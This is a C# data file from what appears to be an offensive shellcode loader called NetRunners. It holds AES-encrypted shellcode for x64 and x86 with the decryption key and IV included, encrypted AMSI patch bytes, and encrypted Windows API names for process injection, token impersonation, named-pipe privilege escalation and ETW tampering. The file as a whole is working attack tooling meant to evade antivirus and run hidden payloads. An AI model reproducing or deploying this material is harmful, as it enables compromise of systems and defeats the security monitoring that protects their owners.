namespace NetRunners.Data
{
    /// <summary>
    /// Contains the encrypted shellcode, decryption key, encrypted api names and encrypted patches (generated by running the NetRunners Encryptor binary).
    /// </summary>
    public static class EncryptedData
    {
        // paste encrypted data and keys here
        public static byte[] AesKey = { 0x9E, 0x7A, 0xAF, 0xA2, 0xB7, 0x08, 0x54, 0x45, 0x8F, 0x02, 0xAD, 0x4B, 0x5F, 0x43, 0x8F, 0xB5, 0x2B, 0x36, 0x5A, 0x23, 0xCE, 0xBD, 0x11, 0x8E, 0x3A, 0xC5, 0xCC, 0x33, 0x22, 0x2E, 0x11, 0x6A };
        public static byte[] AesIv = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93 };
        public static byte[] buf = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x52, 0xB5, 0xAE, 0x08, 0xF6, 0x43, 0x13, 0x15, 0xD3, 0xF7, 0x43, 0xDD, 0x78, 0x67, 0xEA, 0xC2, 0xAD, 0xB3, 0x3E, 0x41, 0x5B, 0x1B, 0x62, 0x58, 0x56, 0xBE, 0x9E, 0x86, 0x9B, 0x18, 0x7E, 0x11, 0x80, 0x6D, 0x13, 0x1D, 0xAA, 0x1C, 0xE8, 0xA8, 0x5E, 0x11, 0xC4, 0x53, 0xB5, 0x42, 0xB7, 0x66, 0xA9, 0xC9, 0xC0, 0x5A, 0xBC, 0x1B, 0x0A, 0x4A, 0x04, 0x96, 0x8D, 0x44, 0xF8, 0x30, 0x89, 0xB1, 0x78, 0xB4, 0x0B, 0xB4, 0xF2, 0x27, 0xA8, 0xA4, 0x33, 0xC5, 0x0B, 0x32, 0x3C, 0xEF, 0xA7, 0x32, 0xF4, 0x62, 0x8E, 0xD5, 0x10, 0xE4, 0xB5, 0xF1, 0x49, 0xB6, 0x7D, 0x26, 0x92, 0xE4, 0xC5, 0xC4, 0x72, 0x9B, 0x38, 0xAB, 0x84, 0x80, 0x8A, 0x57, 0x0F, 0xE2, 0xFA, 0x41, 0xC8, 0x2B, 0x8D, 0xB7, 0x94, 0x13, 0x77, 0xC2, 0xCB, 0x10, 0x14, 0xCA, 0x2F, 0x8D, 0x0B, 0xE6, 0xF2, 0xEF, 0xBE, 0x22, 0x7B, 0xE9, 0x4A, 0xD2, 0xB5, 0x9F, 0x92, 0x7A, 0xEC, 0xCE, 0xE4, 0x4C, 0x07, 0xB2, 0x05, 0xB8, 0x69, 0xE8, 0x30, 0x21, 0x8E, 0x67, 0xF1, 0x65, 0x9C, 0xDD, 0x75, 0xB5, 0x6C, 0xF4, 0x3A, 0x97, 0x48, 0xB5, 0xE4, 0x35, 0x05, 0xE4, 0x3C, 0x5C, 0x1C, 0x85, 0x41, 0x7A, 0xCD, 0x51, 0xE1, 0xF1, 0xF6, 0xA3, 0x2A, 0xAD, 0x65, 0xF9, 0x81, 0xB4, 0x70, 0xFC, 0xC4, 0x7C, 0x8A, 0xFB, 0xE1, 0x18, 0xAB, 0x1E, 0xA1, 0x55, 0x81, 0x56, 0xEF, 0x2E, 0x7E, 0xCE, 0xDD, 0xCC, 0x9B, 0x8D, 0xC3, 0xFC, 0xA4, 0x9D, 0x2B, 0x1D, 0x52, 0x4E, 0x33, 0x40, 0xDE, 0x6C, 0xF9, 0x8F, 0x0F, 0xA1, 0xE5, 0xD3, 0xE8, 0x1A, 0x4F, 0x7A, 0x63, 0x84, 0xDA, 0x2F, 0x97, 0xCE, 0xBC, 0x4A, 0x1B, 0x64, 0x4D, 0x6A, 0xDE, 0x7C, 0x42, 0x81, 0x85, 0x18, 0x03, 0x40, 0xEC, 0xBE, 0x7C, 0x82, 0xF4, 0xF7, 0xB9, 0x71, 0x17, 0xF1, 0x4C, 0x2F, 0xB7, 0xA1, 0xF9, 0x43, 0x79, 0xF8, 0x67, 0x5A, 0x0C, 0x7A, 0xD4, 0x6B, 0xE8, 0x5F, 0x24, 0x20, 0x47, 0xA8, 0x71, 0x96, 0xE5, 0xEA, 0x2D, 0xFF, 0x06, 0x56, 0xE1, 0xA4 };
        public static byte[] buf86 = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x92, 0xA4, 0x2E, 0x26, 0xC8, 0x66, 0x88, 0xFE, 0x59, 0xE3, 0x22, 0x49, 0x2D, 0x6F, 0x95, 0x23, 0xD3, 0x5D, 0xAB, 0xF1, 0xB5, 0x1D, 0x5B, 0x08, 0x97, 0xD3, 0x58, 0x11, 0x44, 0xE7, 0x73, 0xEC, 0x9F, 0x1F, 0x34, 0x2A, 0x70, 0x6B, 0x17, 0x9D, 0x66, 0x7E, 0xD6, 0xE8, 0xE5, 0x19, 0x9B, 0xD5, 0x7A, 0x39, 0x9C, 0x09, 0x9D, 0x69, 0xE0, 0x6A, 0x12, 0xD5, 0x17, 0x0D, 0xA4, 0xEE, 0xEC, 0x7F, 0x6D, 0xD6, 0x10, 0xE8, 0xAF, 0x9B, 0xA6, 0x82, 0x25, 0x24, 0xDD, 0xFA, 0xEC, 0x95, 0xBC, 0x7B, 0x03, 0x94, 0x1A, 0x28, 0xE1, 0xEC, 0x92, 0x44, 0x91, 0xA7, 0x51, 0xDC, 0x77, 0x03, 0x3C, 0x44, 0xD8, 0x07, 0x02, 0x89, 0xD0, 0xC1, 0x2D, 0x22, 0x87, 0xEB, 0x1C, 0xB3, 0xA7, 0xEA, 0xE2, 0x3B, 0xB8, 0x6F, 0x75, 0x84, 0x8A, 0xE2, 0x55, 0x47, 0x0D, 0x09, 0xD3, 0xF9, 0x47, 0x09, 0x40, 0x21, 0x11, 0x04, 0x23, 0x56, 0x0A, 0x8E, 0xFB, 0x57, 0x3A, 0x21, 0xAD, 0xCF, 0xD7, 0xE5, 0xF0, 0xDC, 0x79, 0xDE, 0x09, 0xE0, 0xAC, 0xCB, 0x02, 0xE2, 0x97, 0x8B, 0x5B, 0xFD, 0x1C, 0xC7, 0x4D, 0x2D, 0x5C, 0x98, 0xEC, 0xA0, 0x1E, 0xB5, 0x7D, 0xD4, 0xCC, 0xA1, 0x32, 0x1E, 0x71, 0xF9, 0x0C, 0xEC, 0x07, 0xD9, 0xBC, 0x7E, 0xBD, 0xD5, 0x88, 0x35, 0x4F, 0x34, 0x8C, 0xB0, 0x51, 0xD8, 0x98, 0x9B, 0x27, 0xC2, 0x31, 0x6F, 0x34, 0xEA, 0x77, 0x1D, 0x1C, 0x36, 0x45, 0xA2, 0xC0, 0xD4, 0x5B, 0x92 };
        public static int sBuf = 276;
        public static int sBuf86 = 193;
        public static byte[] AmsiPatch = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x82, 0x8C, 0xF2, 0xEF, 0x64, 0x7D, 0xD6, 0x51, 0xEC, 0x05, 0x8F, 0x88, 0x94, 0x3E, 0x44, 0xC0 };
        public static byte[] AmsiPatch86 = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0xF7, 0x4F, 0xA7, 0xA7, 0x31, 0x1D, 0x95, 0x62, 0xDB, 0x19, 0x56, 0x9C, 0x8E, 0x0D, 0x0C, 0x83 };
        public static byte[] CloseHandle_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0xC6, 0xD1, 0x18, 0xA4, 0x83, 0xF8, 0x45, 0x17, 0x30, 0x55, 0x84, 0x99, 0x21, 0x6D, 0xB9, 0x2D };
        public static byte[] ConnectNamedPipe_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0xFC, 0xC0, 0x27, 0xB0, 0x09, 0xF9, 0x96, 0x72, 0x08, 0x9C, 0x9E, 0x03, 0xE5, 0x63, 0x67, 0x30, 0xB2, 0x2F, 0x50, 0x25, 0xE4, 0x83, 0x8C, 0x59, 0x4B, 0xE1, 0x39, 0x17, 0x4E, 0xF8, 0x13, 0x5F };
        public static byte[] ConvertSidToStringSidW_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x59, 0xAB, 0xC6, 0x17, 0x4B, 0x9C, 0x0D, 0x89, 0xD1, 0x89, 0x95, 0x8F, 0x89, 0x01, 0x54, 0x28, 0x46, 0x32, 0xFE, 0xE5, 0xAE, 0xE5, 0xD3, 0x78, 0xCD, 0xDD, 0xCF, 0xBF, 0x3A, 0x21, 0x52, 0xD9 };
        public static byte[] CreateNamedPipeW_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x6C, 0x61, 0xD1, 0x1F, 0xCE, 0x4B, 0x59, 0x20, 0x9C, 0x53, 0x5C, 0x70, 0x58, 0xEF, 0x8F, 0xE1, 0xF1, 0xC2, 0x38, 0xC3, 0xB4, 0x74, 0x6B, 0x0D, 0x41, 0x21, 0xA9, 0xEE, 0xBF, 0xA2, 0x86, 0xAB };
        public static byte[] CreateProcessA_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x15, 0x08, 0x29, 0x16, 0xCD, 0xA0, 0x73, 0x9D, 0x15, 0xB1, 0xAC, 0x65, 0x5F, 0xE1, 0x45, 0xFB };
        public static byte[] CreateProcessWithTokenW_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x49, 0x02, 0x8A, 0xF0, 0x78, 0x0B, 0xA7, 0xF4, 0x3F, 0x02, 0x6C, 0xDB, 0x94, 0x2A, 0xA4, 0x48, 0x5E, 0x98, 0x3F, 0x93, 0x57, 0x48, 0xC1, 0x36, 0x76, 0x6E, 0x77, 0xBB, 0x08, 0x62, 0xDA, 0x8B };
        public static byte[] CreateRemoteThread_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0xAB, 0xB6, 0x17, 0xA1, 0x56, 0xD4, 0x4E, 0x20, 0xA5, 0x74, 0x7B, 0x47, 0xA8, 0x60, 0xEA, 0xDB, 0x4C, 0x61, 0x96, 0x7F, 0x65, 0xEA, 0xF0, 0xFC, 0x4C, 0xD4, 0x6F, 0x37, 0xCC, 0x5D, 0xCB, 0xAC };
        public static byte[] CreateThread_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0xF5, 0x5E, 0x98, 0x30, 0xA4, 0xEF, 0x23, 0xE5, 0xD0, 0x15, 0xED, 0x4F, 0x6F, 0x9E, 0xF8, 0xA0 };
        public static byte[] CreateToolhelp32Snapshot_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x58, 0x18, 0x74, 0x3B, 0x45, 0x73, 0xA3, 0xC7, 0x06, 0x95, 0x02, 0x19, 0x86, 0xC1, 0x4D, 0x3F, 0x00, 0x5B, 0x20, 0x71, 0xFE, 0xBD, 0xEB, 0x99, 0x7C, 0x8E, 0xC5, 0x5B, 0xBB, 0x8B, 0x16, 0x42 };
        public static byte[] DuplicateTokenEx_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0xD1, 0x27, 0xE2, 0x7E, 0x70, 0xB1, 0xD2, 0x96, 0x9C, 0x32, 0xCD, 0x7A, 0xEF, 0x95, 0x3F, 0xD9, 0xF2, 0x60, 0xF2, 0x86, 0x60, 0x8E, 0xE1, 0x2D, 0xCA, 0x92, 0x96, 0x37, 0x5D, 0xF7, 0x63, 0x9F };
        public static byte[] FlsAlloc_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x08, 0x42, 0x7C, 0xF3, 0xE8, 0x49, 0x98, 0x34, 0xC8, 0xBE, 0xDA, 0xE6, 0xF3, 0x4C, 0x38, 0x83 };
        public static byte[] GetCurrentProcess_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x54, 0x7E, 0x85, 0x5E, 0xE3, 0xA3, 0x10, 0xD2, 0x98, 0xD8, 0x05, 0x6A, 0xA1, 0x51, 0xDF, 0x31, 0xA4, 0xA8, 0xB5, 0x41, 0x3A, 0x8E, 0xCF, 0x57, 0x52, 0x13, 0xEC, 0xEE, 0x9D, 0xB4, 0x97, 0x2F };
        public static byte[] GetCurrentThread_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x99, 0xF4, 0x0E, 0xF4, 0xE2, 0x84, 0xF1, 0x46, 0x92, 0xBC, 0x5E, 0x33, 0x94, 0xC0, 0xB3, 0x62, 0x1B, 0x79, 0x8C, 0xCE, 0x60, 0xC8, 0x8F, 0x99, 0x1A, 0xC9, 0x98, 0x62, 0x02, 0xD2, 0x5C, 0x7E };
        public static byte[] GetStdHandle_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x9A, 0xDB, 0xE7, 0xF2, 0x3C, 0x1C, 0xFC, 0x0F, 0x8D, 0x37, 0xF7, 0x37, 0x4A, 0x01, 0x19, 0xBC };
        public static byte[] GetTokenInformation_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x0C, 0x37, 0x6B, 0x27, 0x1B, 0x4A, 0x61, 0x56, 0x63, 0x19, 0x19, 0xBD, 0x8C, 0x5D, 0xEE, 0x9D, 0x42, 0x4E, 0xA1, 0xB8, 0x4A, 0x38, 0x26, 0x19, 0x72, 0xD3, 0xAE, 0x4B, 0x47, 0x85, 0xB6, 0xD9 };
        public static byte[] ImpersonateNamedPipeClient_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x8B, 0x85, 0x4D, 0x71, 0x5E, 0xE8, 0x89, 0x28, 0x68, 0x60, 0xF3, 0xA3, 0x49, 0x70, 0x24, 0xC2, 0x8B, 0x04, 0x16, 0x3E, 0x31, 0x9C, 0xDF, 0x52, 0x05, 0x48, 0xFD, 0xB8, 0xFA, 0x37, 0xFF, 0xD2 };
        public static byte[] IsWow64Process_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0xB8, 0x7B, 0x9A, 0x13, 0xB3, 0x25, 0x82, 0x96, 0xAA, 0xED, 0x0A, 0x1A, 0xE1, 0xD0, 0x44, 0x55 };
        public static byte[] LoadLibraryA_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0xAC, 0x1B, 0xAC, 0x27, 0xC1, 0xC0, 0x2C, 0x2D, 0xC4, 0x53, 0x68, 0xDE, 0x21, 0xC7, 0xDB, 0xAC };
        public static byte[] NtTraceEvent_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x11, 0x72, 0x35, 0xCA, 0x06, 0x7C, 0x39, 0x58, 0xB0, 0x8F, 0x03, 0x43, 0x86, 0xA1, 0xEC, 0xBF };
        public static byte[] OpenProcess_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x3B, 0x70, 0xA5, 0x75, 0x98, 0x77, 0xF4, 0xB5, 0xF2, 0x8D, 0x6A, 0xAC, 0xD2, 0x3D, 0x12, 0xCD };
        public static byte[] OpenThread_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x26, 0x35, 0x3F, 0xA0, 0xFC, 0x4B, 0xA7, 0x29, 0x0C, 0x36, 0x8E, 0x8A, 0x47, 0x15, 0x5E, 0x32 };
        public static byte[] OpenThreadToken_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x42, 0x9D, 0x89, 0x3B, 0xA2, 0xB6, 0x8A, 0x7F, 0x54, 0xAB, 0xF3, 0x15, 0x82, 0x0E, 0x87, 0xD4 };
        public static byte[] Process32First_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x05, 0x07, 0xEE, 0x91, 0xC6, 0x7B, 0x20, 0xA3, 0xD3, 0x96, 0x31, 0x4E, 0x15, 0x73, 0x71, 0x42 };
        public static byte[] Process32Next_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0xD9, 0x28, 0xA0, 0x1D, 0xCD, 0x28, 0x98, 0x14, 0x68, 0x96, 0xBC, 0x08, 0x52, 0x09, 0x88, 0x3C };
        public static byte[] ReadProcessMemory_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x6E, 0xD2, 0x2B, 0xF2, 0x27, 0x0F, 0xDF, 0xD9, 0xE0, 0x76, 0x0A, 0x9E, 0x52, 0x55, 0xC1, 0x62, 0x1B, 0x1A, 0x69, 0x66, 0x89, 0x97, 0x44, 0x0B, 0xE8, 0xC6, 0x6D, 0x57, 0x0B, 0x8F, 0x7D, 0x96 };
        public static byte[] ResumeThread_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x1B, 0x2C, 0xD0, 0x3B, 0x03, 0xA6, 0xF9, 0x14, 0x50, 0xAC, 0x48, 0x6F, 0x01, 0xC9, 0x56, 0x51 };
        public static byte[] SuspendThread_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0xE3, 0x59, 0xB9, 0x44, 0xB7, 0x29, 0xE1, 0xFD, 0xD6, 0xA6, 0xD3, 0x4F, 0x71, 0xB2, 0x00, 0x67 };
        public static byte[] VirtualAlloc_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0xA9, 0xAF, 0xAF, 0x76, 0x5B, 0xE9, 0x96, 0xA5, 0x44, 0xD2, 0xFA, 0x6C, 0x6C, 0x40, 0xF5, 0xE1 };
        public static byte[] VirtualAllocEx_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0xD7, 0x6E, 0x75, 0x7F, 0x46, 0xF3, 0x6B, 0xE3, 0x7E, 0x31, 0xD9, 0x84, 0x1A, 0xC5, 0xFC, 0x0F };
        public static byte[] VirtualAllocExNuma_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x90, 0xA1, 0x20, 0x9F, 0xEF, 0x40, 0x6B, 0x9D, 0x4F, 0x5B, 0x9B, 0x75, 0xB3, 0x96, 0x1B, 0xC1, 0x6A, 0xFD, 0xEB, 0x94, 0xB3, 0xBD, 0x6A, 0x5F, 0x8B, 0x5B, 0xC3, 0xCE, 0xBE, 0x0D, 0xCA, 0xAD };
        public static byte[] VirtualProtect_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x52, 0x54, 0x22, 0xC5, 0xD6, 0x21, 0x09, 0x15, 0xED, 0x78, 0xAE, 0x37, 0xA4, 0xF8, 0x9A, 0xB3 };
        public static byte[] VirtualProtectEx_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x25, 0x7D, 0xD7, 0x0C, 0x91, 0x0A, 0x05, 0xFB, 0x21, 0x4F, 0xB9, 0xCF, 0xA2, 0x4C, 0x81, 0x72, 0xD8, 0x90, 0x7A, 0x8B, 0x76, 0xBC, 0x60, 0xA2, 0x11, 0x82, 0xF4, 0x5A, 0x2E, 0x68, 0x6F, 0xB1 };
        public static byte[] WaitForSingleObject_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x1F, 0x26, 0xDE, 0xEE, 0x24, 0xF3, 0x85, 0x7B, 0xBD, 0x82, 0xD9, 0x9C, 0x21, 0xB5, 0x7D, 0x71, 0x7C, 0x84, 0xC6, 0x6B, 0x7D, 0x0A, 0x8A, 0x45, 0x78, 0xB6, 0x5C, 0x65, 0x39, 0xFD, 0x71, 0xA0 };
        public static byte[] WriteProcessMemory_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x73, 0xCF, 0x7C, 0xC1, 0xFE, 0xAA, 0x76, 0x1A, 0x55, 0xD2, 0x65, 0xFA, 0x68, 0xA3, 0xF7, 0x1B, 0x95, 0xD9, 0x93, 0x00, 0xBA, 0x97, 0x71, 0x00, 0x59, 0x84, 0x47, 0x8F, 0x0C, 0xDA, 0x3C, 0x29 };
        public static byte[] ZwQueryInformationProcess_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x2F, 0x99, 0x60, 0xF0, 0xCB, 0xA7, 0x85, 0x70, 0x4D, 0x89, 0xF5, 0xB7, 0xDC, 0xC7, 0xE0, 0x84, 0x11, 0xFA, 0xD9, 0xCD, 0xB0, 0x61, 0xC8, 0x2E, 0xD1, 0xF1, 0x56, 0x46, 0x33, 0x49, 0xBD, 0x39 };
        public static byte[] amsidll_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0xBC, 0x2D, 0xFD, 0xDC, 0x0B, 0x93, 0xDF, 0x8E, 0x72, 0x8D, 0xE4, 0x23, 0xF7, 0xCE, 0x56, 0xD8 };
        public static byte[] AmsiScanBuffer_Bytes = { 0xA8, 0x68, 0x81, 0x6C, 0x57, 0x82, 0x87, 0xBF, 0xEA, 0x28, 0x4D, 0x9B, 0x8A, 0xCC, 0x00, 0x93, 0x65, 0x12, 0x83, 0xCF, 0xEC, 0x48, 0x4A, 0x3F, 0x6C, 0xAA, 0xC3, 0x59, 0x12, 0xC5, 0x73, 0x1A };
    }
}
